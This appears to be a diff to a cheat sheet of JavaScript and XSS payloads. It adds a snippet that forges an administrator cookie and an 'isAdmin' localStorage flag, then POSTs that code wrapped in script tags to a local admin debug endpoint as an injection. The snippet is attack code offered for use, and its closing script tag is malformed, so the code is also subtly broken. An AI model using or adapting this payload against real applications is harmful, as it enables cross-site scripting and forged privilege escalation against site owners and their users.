@@ -17,6 +17,10 @@ document.addEventListener('click', (event) => {
 
 # Change to a different location
 location.href = '/<URI>';
+
+# Post
+var payload = "document.cookie='Role-Identifier=Administrator; path=/'; localStorage.setItem('isAdmin', '1'); location.href='http://localhost:7149/admin';";
+fetch("http://localhost:7149/admin/debug-test?DebugTest=<script>" + encodeURIComponent(payload) + "<script>", {method: "POST"});
 ```
 
 # XSS Payload
